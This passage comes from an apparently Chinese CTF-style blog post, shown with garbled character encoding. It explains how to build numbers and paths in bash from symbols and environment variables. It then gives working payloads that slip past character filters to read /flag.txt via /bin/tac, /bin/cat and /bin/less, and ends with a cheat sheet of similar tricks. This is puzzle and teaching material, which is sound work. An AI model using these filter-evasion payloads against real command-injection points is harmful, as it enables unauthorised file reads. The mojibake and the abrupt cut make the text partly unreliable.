| $(())                                                        </span><br><span class="line">0    | $#                                                           </span><br><span class="line">1    | $((~$(($((~$(())))$((~$(())))))))                            </span><br><span class="line">1    | $&#123;##&#125;                                                       </span><br><span class="line">2    | $((~$(($((~$(())))$((~$(())))$((~$(())))))))                 </span><br><span class="line">2    | $(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))                                            </span><br><span class="line">3    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">3    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;))</span><br><span class="line">4    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">4    | $(($&#123;##&#125;&lt;&lt;$(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))))                                </span><br><span class="line">5    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br><span class="line">5    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;))                       </span><br><span class="line">6    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">6    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$(())))                       </span><br><span class="line">7    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">7    | $(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))                     </span><br><span class="line">8    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br><span class="line">8    | $&#123;LANG:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;        </span><br><span class="line">9    | $((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) </span><br></pre></td></tr></table></figure><p>æœ‰ä¸€ä¸ªå¾ˆç‰¹æ®Šçš„ï¼š</p><p><img src="https://i.loli.net/2021/05/03/nr3wmfpUkDPZ2Re.png"></p><p>ä¹‹å‰ä¿å­˜çš„å¥½åƒæ˜¯è¿”å› 5ï¼Œè¿™é‡Œè¿”å›çš„æ˜¯ 4ï¼Œä¸æ¸…æ¥šä¸ºä»€ä¹ˆï¼Œæ‰€ä»¥ä¸åˆ—å…¥è¡¨ä¸­ï¼ˆåº”è¯¥æ˜¯å› ä¸º $0 è¿”å› <code>-bash</code> è€Œ <code>#</code> æ”¾åœ¨å‰é¢æ˜¯è·å– $0 çš„é•¿åº¦ï¼‰ï¼ˆè€Œä¸”åªè¦è¿™ä¸ªå­—ç¬¦å‡ºç°åœ¨æˆ‘çš„åšå®¢é‡Œé¢æˆ‘çš„åšå®¢å°±ä¼šå‡ºé—®é¢˜ï¼Œåäº†ã€‚ã€‚ã€‚ï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">å­—ç¬¦åŠå­—ç¬¦ä¸²   | æ„é€ </span><br><span class="line">/bin/        | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;</span><br><span class="line">l            | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">ca           | $&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;</span><br><span class="line">t            | $&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;                                   </span><br><span class="line">.            | $&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):1&#125;</span><br><span class="line">/bin/cat     | $&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):2&#125;$&#123;HOME:$((~$(()))):$&#123;##&#125;&#125;</span><br></pre></td></tr></table></figure><p>å¾…è¡¥å……â€¦â€¦</p><h3 id="åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) # ä»¥åŠæ•°å­—æ„é€ ä»»æ„æ•°</h3><p><code>$((2#1000001)) = 53</code></p><p>å½¢å¼: <code>$((2#&#123;äºŒè¿›åˆ¶&#125;))) = &#123;å…«è¿›åˆ¶&#125;</code></p><h3 id="åˆ©ç”¨-æ„é€ ä»»æ„æ•°"><a href="#åˆ©ç”¨-æ„é€ ä»»æ„æ•°" class="headerlink" title="åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°"></a>åˆ©ç”¨ $ ( ) ~ æ„é€ ä»»æ„æ•°</h3><p>ä»¥ <code>$(($(($a))$(($b))$(($c))$(($d))$(($e))$(($f))))</code> ä¸ºä¾‹å­å§ï¼š</p><h4 id="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"><a href="#å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ" class="headerlink" title="å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ"></a>å«æœ‰ä»»ä½•è´Ÿæ•°çš„æƒ…å†µ</h4><p>åªè¦æœ‰ä»»æ„ <code>$(($n))</code> ä¸ºè´Ÿæ•°ï¼Œåˆ™è¡¨è¾¾å¼çš„ç»“æœä¸ºï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">å¦‚æœæ˜¯æ­£æ•°ï¼Œåˆ™æ‹¼æ¥åˆ°å‰ä¸€ä½çš„æœ«å°¾</span><br><span class="line">å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™ä¸å‰é¢åˆ†å¼€</span><br></pre></td></tr></table></figure><p>æ¯”å¦‚ï¼š<code>$(($((1))$((0))$((-1))$((1))$((2))$((1))))</code> çš„æƒ…å†µï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 1 0 -1 1 2 1</span><br><span class="line">=&gt; (10) + (-1121)</span><br><span class="line">=&gt; -1111</span><br></pre></td></tr></table></figure><p>æˆ–è€…ï¼š<code>$(($((-1))$((0))$((-1))$((1))$((2))$((1))))</code>ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((-<span class="number">1</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((<span class="number">2</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; -1 0 -1 1 2 1</span><br><span class="line">=&gt; (-10) + (-1121)</span><br><span class="line">=&gt; -1131</span><br></pre></td></tr></table></figure><p>äº¦æˆ–è€…ï¼š<code>$(($((6))$((0))$((-1))$((1))$((-3))$((1))))</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(($((<span class="number">6</span>))$((<span class="number">0</span>))$((-<span class="number">1</span>))$((<span class="number">1</span>))$((-<span class="number">3</span>))$((<span class="number">1</span>))))</span></span><br><span class="line">=&gt; 6 0 -1 1 -3 1</span><br><span class="line">=&gt; (60) + (-11) + (-31)</span><br><span class="line">=&gt; 18</span><br></pre></td></tr></table></figure><h4 id="a-ä¸º-0-çš„æƒ…å†µ"><a href="#a-ä¸º-0-çš„æƒ…å†µ" class="headerlink" title="$(($a)) ä¸º 0 çš„æƒ…å†µ"></a>$(($a)) ä¸º 0 çš„æƒ…å†µ</h4><p>å½“ <code>$(($a))</code> ä¸º 0ï¼Œä¸”å…¶å®ƒéƒ½ä¸ºéè´Ÿæ•°æ—¶ï¼Œæ•´ä¸ªè¡¨è¾¾å¼çš„ç»“æœæœ€åä¸ºï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">f * 2 ** 0 + <span class="variable">$e</span> * 2 ** 3 + <span class="variable">$d</span> * 2 ** 6 + <span class="variable">$c</span> * 2 ** 9 Â·Â·Â·Â·Â·Â·</span></span><br><span class="line">å³ä»æœ€åçš„ $(($n)) å¼€å§‹ï¼Œå¾€å‰æ¨ï¼Œç›´åˆ°ç¬¬ä¸€ä½</span><br></pre></td></tr></table></figure><h4 id="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"><a href="#å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ" class="headerlink" title="å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ"></a>å…¨éƒ¨ä¸ºæ­£æ•°çš„æƒ…å†µ</h4><p>å¦‚æœæ‰€æœ‰çš„ <code>$(($n))</code> éƒ½ä¸ºæ­£æ•°ï¼Œåˆ™å…¨éƒ¨æ‹¼æ¥åœ¨ä¸€èµ·è¾“å‡ºâ€¦â€¦</p><h2 id="å‘½ä»¤æ‰§è¡Œ"><a href="#å‘½ä»¤æ‰§è¡Œ" class="headerlink" title="å‘½ä»¤æ‰§è¡Œ"></a>å‘½ä»¤æ‰§è¡Œ</h2><h3 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h3><p>å‰ä¸ä¹…æƒ³æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç‰¹æ„å»ç ”ç©¶äº†ä¸€ä¸‹</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt; $ ? : ; . &#123; &#125; ~</span><br><span class="line">A D E F H I L M N O P R T S U V</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬é¦–å…ˆçœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰å°å†™å­—æ¯ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤æ˜¯ä¸å¯èƒ½çš„ï¼Œç„¶ååªèƒ½æƒ³åˆ°åˆ©ç”¨ <code>/bin/cat</code> è¿™ä¸€ç±»çš„æ¥å°è¯•ä¸€ä¸‹ï¼Œä½†æ˜¯ / ä¹Ÿè¢«è¿‡æ»¤äº†ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±è¦æ€è€ƒä¸€ä¸‹ / ä»å“ªé‡Œæ¥äº†</p><p>ç»™äº†å¤§å†™å­—æ¯å’Œ $ { } å¯ä»¥å°è¯•ä¸€ä¸‹åˆ©ç”¨ç¯å¢ƒå˜é‡ï¼Œenv è¿™ä¸ªæŒ‡ä»¤å¯ä»¥è·å–ç¯å¢ƒå˜é‡ï¼Œä¸åŒäººçš„æœºå­ä¸ä¸€æ ·ï¼Œç¯å¢ƒå˜é‡ä¹Ÿä¸ä¸€æ ·ï¼Œå¯èƒ½ä¼šæœ‰æ‰€å‡ºå…¥ï¼Œä½†æ˜¯æˆ‘çš„æ˜¯ ok çš„ï¼Œæ‰€ä»¥ç›¸ä¿¡å¤§å®¶çš„éƒ½ ok</p><p>å› ä¸º <code>PATH</code> æ˜¯ <code>/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°è¯•å–å®ƒçš„ç¬¬ä¸€ä½ï¼Œå°±å¯ä»¥è·å¾— / äº†ï¼Œç„¶ååˆæœ‰ <code>SHELL</code> ä¸º <code>/bin/bash</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¹Ÿå¯ä»¥å°è¯•å–å®ƒçš„å‰äº”ä½ï¼Œå°±æ˜¯ <code>/bin/</code>ï¼Œç„¶åå°±åªè¦è€ƒè™‘åé¢ç”¨å“ªä¸ªå‘½ä»¤è¯»å–äº†ï¼Œä½†æ˜¯é—®é¢˜å°±æ¥äº†ï¼Œé¢˜ç›®å¹¶æ²¡æœ‰ç»™ğŸ‘´æ•°å­—ï¼Œé‚£ğŸ‘´æ€ä¹ˆåŠå‘¢ï¼Œå¾ˆç®€å•</p><hr><p>shell ä¸­è¿è¡Œçš„æ¯ä¸ªå‘½ä»¤éƒ½ä½¿ç”¨é€€å‡ºçŠ¶æ€ç ï¼ˆexit statusï¼‰æ¥å‘Šè¯‰shell å®ƒå®Œæˆäº†å¤„ç†ã€‚é€€å‡ºçŠ¶æ€ç æ˜¯ä¸€ä¸ª 0 ~ 255 ä¹‹é—´çš„æ•´æ•°å€¼ï¼Œåœ¨å‘½ä»¤ç»“æŸè¿è¡Œæ—¶ç”±å‘½ä»¤ä¼ ç»™shell</p><p>Linux ä½¿ç”¨äº† $? è¿™ä¸ªä¸“å±å˜é‡æ¥ä¿å­˜ä¸Šä¸ªæ‰§è¡Œçš„å‘½ä»¤çš„é€€å‡ºçŠ¶æ€ç </p><hr><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨ $?  æ¥æ¦¨å–ä¸€ä¸ªæ•°å­—ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥æ¦¨å–åˆ°å“ªä¸ªæ•°å­—å‘¢ï¼Œåˆæ˜¯å¦å¯¹æˆ‘ä»¬çš„æ“ä½œæœ‰å¸®åŠ©å‘¢</p><p>Linux çš„é”™è¯¯çŠ¶æ€é€€å‡ºçŠ¶æ€ç æ²¡æœ‰ä»€ä¹ˆæ ‡å‡†å¯éµå¾ªï¼Œä½†æœ‰ä¸€äº›å‚è€ƒ</p><table><thead><tr><th>çŠ¶æ€ç </th><th>æè¿°</th></tr></thead><tbody><tr><td>0</td><td>å‘½ä»¤æˆåŠŸç»“æŸ</td></tr><tr><td>1</td><td>ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯</td></tr><tr><td>2</td><td>ä¸é€‚åˆçš„ shell å‘½ä»¤</td></tr><tr><td>123</td><td>å‘½ä»¤ä¸å¯æ‰§è¡Œ</td></tr><tr><td>127</td><td>æ²¡æ‰¾åˆ°å‘½ä»¤</td></tr><tr><td>128</td><td>æ— æ•ˆé€€å‡ºå‚æ•°</td></tr><tr><td>128+x</td><td>ä¸ Linux ä¿¡å·xç›¸å…³çš„ä¸¥é‡é”™è¯¯</td></tr><tr><td>130</td><td>é€šè¿‡ ctrl+c ç»ˆæ­¢çš„å‘½ä»¤</td></tr><tr><td>255</td><td>æ­£å¸¸èŒƒå›´ä¹‹å†…çš„é€€å‡ºçŠ¶æ€ç </td></tr></tbody></table><p>emmï¼Œâ€ä¸€èˆ¬æ€§æœªçŸ¥é”™è¯¯â€œ</p><p><img src="https://i.loli.net/2021/04/24/DBCWrJxRAa9ctny.png"></p><p>å½³äºï¼Œé‚£æˆ‘ä»¬å°±æœ‰ä¸€ä¸ª 1 äº†ï¼Œä¸è¿‡ 2 å•¥çš„è¿˜æ²¡æ‰¾åˆ°å’‹æï¼Œä¸è¿‡æœ‰ä¸€ä¸ª 1 å°±å¤Ÿäº†ï¼Œå› ä¸ºæˆ‘ä»¬è¿˜æœ‰ä¸€ä¸ª <code>RANDOM</code> ç¯å¢ƒå˜é‡å¯ä»¥åˆ©ç”¨ï¼š<code>&lt;A;echo $&#123;RANDOM:~A:$?&#125;</code>ï¼Œä»‹ä¸ªæ ·å­å°±å¯ä»¥å–åˆ°ä¸€ä½éšæœºæ•°äº†ï¼Œå¾ˆç„å­¦çš„ä¸€ä¸ªåœ°æ–¹å°±æ˜¯ <code>~A</code> è¿™ä¸ªç©æ„å„¿ä¼¼ä¹åœ¨ <code>$&#123;&#125;</code> å¯ä»¥å–åˆ°ç¯å¢ƒå˜é‡çš„æœ€åä¸€ä½çš„ä½ç½®ï¼Œåˆ©ç”¨è¿™ä¸ªç‚¹å¯ä»¥ç©å¾ˆå¤šéªšçš„</p><p><img src="https://i.loli.net/2021/04/24/xoP3ThNclKmziE2.png"></p><p>å¥½äº†ï¼Œéšæœºä¸ªä½æ•°å­—ä¹Ÿæ¥äº†ï¼Œæˆ‘ä»¬åªéœ€è¦è¿™æ ·ï¼š<code>&lt;A;echo $&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;</code>ï¼Œéšæœºåˆ°ä¸€ä¸ª 5 å°±å¯ä»¥è·å¾— <code>/bin/</code> è¾£ï¼Œé‚£ä¹ˆæ€ä¹ˆè¯»æ–‡ä»¶å‘¢ï¼Œçœ‹äº†è›®ä¹…çš„ env åå‘ç°ï¼Œä¼¼ä¹ç”¨ tac æ˜¯æœ€å¥½çš„é€‰æ‹©ï¼Œå› ä¸ºæœ€åä¸€ä½çš„ t è›®å¤šçš„ï¼Œæ¯”å¦‚ HOMEï¼ŒUSERï¼ŒMAILï¼ˆæˆ‘çš„åæ­£æ˜¯ï¼‰</p><p><img src="https://i.loli.net/2021/04/24/5SOdXyIuqklrJTm.png"></p><p>ç„¶åç©ºæ ¼ç”¨ $IFS éšä¾¿è¿‡äº†ï¼Œæœ€åæ–‡ä»¶é©¬é©¬è™è™ä¸€ä¸ª <code>$&#123;PATH::$?&#125;????.???</code> ä»£æ›¿äº† /flag.txtï¼Œæœ€ç»ˆ payloadï¼š<code>&lt;A;$&#123;SHELL::$&#123;RANDOM::$?&#125;&#125;$&#123;USER:~A:$?&#125;??$IFS$&#123;PATH::$?&#125;????.???</code></p><p>ä½ åˆ«è¯´ï¼Œæˆ‘è¿˜çœŸè¯»å‡ºæ¥äº†å¥¥</p><p><img src="https://i.loli.net/2021/04/24/PZC6YcRTd2xHIJu.jpg"></p><p>ä½†æ˜¯å¾ˆå¥‡æ€ªçš„ä¸€ç‚¹ï¼Œå°±æ˜¯ <code>/bin/t?? flag.txt</code> çš„æ—¶å€™ä¼šå‡ºç°å‰ä¸Šå›¾ä¸€å¤§ä¸²å¥‡æ€ªçš„ä¹±ç ï¼Œä½†æ˜¯ç›´æ¥ <code>/bin/tac flag.txt</code> ä¸ä¼š</p><p><img src="https://i.loli.net/2021/04/24/JPpEVxyIgN9vFsR.png"></p><p>è¿™ä¸€ç‚¹ä¸å’‹ç†è§£ï¼Œä½†æ˜¯æ— ä¼¤å¤§é›…</p><p>æœ€åå†æ¥ä¸€ä¸ªï¼Œæˆ‘æŠŠ &lt; æˆ–è€… $? è¿‡æ»¤ï¼ˆå°±æ˜¯è¿™ä¿©è´§è¿åœ¨ä¸€èµ·å°±è¿‡æ»¤ï¼‰çš„è¯åº”è¯¥æ€ä¹ˆåŠï¼Ÿ</p><p>å¾ˆç®€å•ï¼Œç”¨ <code>SHIVL</code> å°± ok äº†ï¼ŒSHIVL=1</p><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>è¿™ä¼šæƒ³ç»§ç»­æŠ˜ç£¨ä¸€ä¸‹å¤§ä¸€æ–°ç”Ÿï¼Œç»“åˆäº†ä¸€ä¸‹å‰é¢çš„æ„é€ æ•°å­—ï¼Œåº”è¯¥æŒºç®€å•çš„ï¼Œä¸ç§’æ‰çš„è¯å°±è¦æ‰“PP</p><p>okï¼Œç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /FLAG.TXT æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼ŒåŒæ—¶ç¦æ­¢å‡ºç°å½¢å¦‚ <code>~A</code> çš„å­—ç¬¦ä¸²ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ : &#123; &#125; ( ) ~</span><br><span class="line">A D E F G H I L M N O P R T S U X</span><br></pre></td></tr></table></figure><p><del>å…ˆä¸å†™äº†ï¼ŒğŸ‘´ä¹Ÿè¿˜æ²¡ä»”ç»†æƒ³ï¼Œåªæ˜¯è§‰å¾—è¿™æ ·å¯ä»¥å‡ºï¼Œè¿™å‘¨æœ«è¯¾è®¾ï¼Œå¤ªçƒ¦äº†ï¼Œç¡äº†</del></p><p>å¾ˆç®€å•ï¼šåˆ©ç”¨ğŸ‘´å‰é¢åˆ—å‡ºæ¥çš„è¡¨æ ¼å°± ok äº†ï¼Œæ­¤å¤„ä¾¿ä¸åšè¯¦è§£ï¼Œç›´æ¥ç»™å‡º payloadï¼šï¼ˆ/bin/cat FLAG.TXTï¼‰<code>$&#123;SHELL::$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;PATH:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))$((~$(())))))))&#125;$&#123;HOME:$((~$(()))):$((~$(($((~$(())))$((~$(())))))))&#125;$IFS$9FLAG$&#123;LANG:$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))):$((~$(($((~$(())))$((~$(())))))))&#125;TXT</code></p><p><img src="https://i.loli.net/2021/05/03/TIgDzNHnW5V9QBm.png"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>è¶ŠææŠ˜ç£¨ğŸ‘´è¶Šå…´å¥‹ï¼Œæ¥ä¸€æ³¢æ–°çš„ç®€å•æ€è·¯</p><p>ç°åœ¨æŠ›å‡ºä¸€ä¸ªé—®é¢˜ï¼šç°åœ¨ğŸ‘´è¯•å›¾è¯»å‡º /flag.txt æ–‡ä»¶ï¼Œä½†æ˜¯ğŸ‘´è¢«é™åˆ¶äº†å­—ç¬¦ï¼Œåªå…è®¸ä½¿ç”¨å¦‚ä¸‹å­—ç¬¦ï¼Œæ€è§£</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ &#123; &#125; : 0-9 ? &#x2F; .</span><br></pre></td></tr></table></figure><p>å¤ªç®€å•äº†å¤ªç®€å•äº†ï¼Œç›´æ¥ç»™å‡º payload å§ï¼Œéƒ½ä¸éœ€è¦åˆ†æçš„ï¼šï¼ˆ/bin/less flag.txtï¼‰</p><p><code>/$&#123;0:1:1&#125;??/??$&#123;0:3:1&#125;$&#123;0:3:1&#125; ????.???</code></p><p><img src="https://i.loli.net/2021/05/03/pJRLBk1ijWTIb9u.png"></p><p><img src="https://i.loli.net/2021/05/03/WSBwGPX7LVpeORH.png"></p><p>because $0 è¿”å› <code>-bash</code>ï¼ˆè¿™ä¸ªå¥½åƒç¡®å®æœ‰ä¸åŒï¼Œ@LemonPrefect å¸ˆå‚…çš„å’Œæˆ‘çš„å°±æœ‰åŒºåˆ«ï¼Œä»–çš„ $0 æ˜¯è¿”å› bashï¼Œå¯èƒ½æ˜¯å› ä¸ºğŸ‘´çš„bashç‰ˆæœ¬å¤ªæ—§äº†ï¼Œå½“ç„¶ï¼Œåªæ˜¯ä¸€ä¸ª - çš„åŒºåˆ«ï¼Œæœ¬è´¨è¿˜æ˜¯æ²¡æœ‰å½±å“çš„</p><hr><p><img src="https://i.loli.net/2021/05/03/K9Nk4YmxFnvGLlI.png"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘çš„ bash ç‰ˆæœ¬æ˜¯ 4.26.46(1)ï¼Œ@LemonPrefect å¸ˆå‚…ç”¨çš„æœ€è€çš„ 4.26.46(2) æµ‹è¯•ä¹Ÿæ˜¯è¿”å› <code>bash</code>ï¼Œè€Œé <code>-bash</code>ï¼Œæ­¤å¤„æ„Ÿè°¢ @LemonPrefect å¸ˆå‚…å¸®å¿™æµ‹è¯•</p><h2 id="è¡¥å……"><a href="#è¡¥å……" class="headerlink" title="è¡¥å……"></a>è¡¥å……</h2><p>å…³äºå‰é¢è¿™ä¹ˆå¤šéªšä¸œè¥¿ï¼Œè¡¥å……ä¸€äº›åŸºæœ¬åŸç†å’Œæ³¨æ„äº‹é¡¹å§ã€‚</p><p>é¦–å…ˆè¯´è¯´ä¸ºä»€ä¹ˆ $# ä¼šè¿”å› 0 å§ï¼Œæˆ‘ä¸çŸ¥é“</p><p>ç®—äº†ï¼Œæ‡’èµ·æ¥äº†ï¼Œå…ˆä¸æäº†ï¼Œè¿‡æ®µæ—¶é—´å†æ•´ç†å§ã€‚ï¼ˆåˆ«æ‰“ğŸ‘´</p><p>å¯¹äº†ï¼Œè´´ä¸ª bash å¯¹äº <code>$&#123;&#125;</code> å®šä¹‰çš„ç”¨æ³•å§ï¼Œä¹‹åä¼šè¯¦ç»†è¯´æ˜ä¸€æ³¢</p><p><img src="https://i.loli.net/2021/05/03/v7I9upJgMcy6Kdl.png"></p><hr><p>åœ¨ @Guoke é‚£é‡Œçœ‹åˆ°äº†ä»–æ€»ç»“çš„ä¸€äº›ï¼Œå…ˆå·è¿‡æ¥ï¼Œæ”¹å¤©æ•´ç†ä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šæ–°å§¿åŠ¿ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">echo $&#123;PWD:0:1&#125;</span><br><span class="line">è·å–å˜é‡PWDçš„ç¬¬ä¸€ä¸ªå­—ç¬¦</span><br><span class="line">echo $&#123;PWD::1&#125;</span><br><span class="line">å¯ä»¥ä¸ºç©ºã€‚ä¸ºç©ºçš„éƒ¨åˆ†å°±å½“ä½œ0äº†</span><br><span class="line">echo $&#123;PWD#??????&#125;</span><br><span class="line">$&#123;å˜é‡#å­—ç¬¦ä¸²&#125;è¡¨ç¤ºåœ¨å˜é‡ä¸­ã€‚æˆªå–å­—ç¬¦ä¸²å³è¾¹çš„å€¼ã€‚å¯ä»¥ç”¨æ¨¡ç³ŠåŒ¹é…ã€‚æˆªå–PWDçš„æœ€åä¸€ä½</span><br><span class="line">echo $&#123;PWD%??????&#125;</span><br><span class="line">$&#123;å˜é‡%å­—ç¬¦ä¸²&#125;è¡¨ç¤ºåœ¨å˜é‡ä¸­ã€‚æˆªå–å­—ç¬¦ä¸²å·¦è¾¹çš„å€¼ã€‚å¯ä»¥ç”¨æ¨¡ç³ŠåŒ¹é…ã€‚æˆªå–PWDçš„ç¬¬ä¸€ä½</span><br><span class="line">echo $&#123;#PWD&#125;</span><br><span class="line">è·å–å˜é‡PWDçš„é•¿åº¦</span><br><span class="line">AASAA;echo $&#123;#_&#125;</span><br><span class="line">$_ã€‚è¡¨ç¤ºä¸Šä¸€ä¸ªå‘½ä»¤çš„è¿”å›ç»“æœã€‚è¿™æ ·å°±å¯ä»¥æ„é€ ä»»æ„æ•°å­—</span><br><span class="line">echo $&#123;#A&#125;</span><br><span class="line">ç”±äºå˜é‡Aæ²¡å®šä¹‰ã€‚æ‰€ä»¥ä»–çš„é•¿åº¦ä¸º0.</span><br><span class="line">echo $OPTIND</span><br><span class="line">è¿™ä¸ªä¹Ÿå¯ä»¥è·å–æ•°å­—1</span><br><span class="line">&gt;B;echo $?</span><br><span class="line">æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ,å¯ä»¥è·å¾—æ•°å­—0</span><br><span class="line">&lt;B;echo $?</span><br><span class="line">æœ€åè¿è¡Œçš„å‘½ä»¤çš„ç»“æŸä»£ç ,å¯ä»¥è·å¾—æ•°å­—1</span><br><span class="line">echo $RANDOM</span><br><span 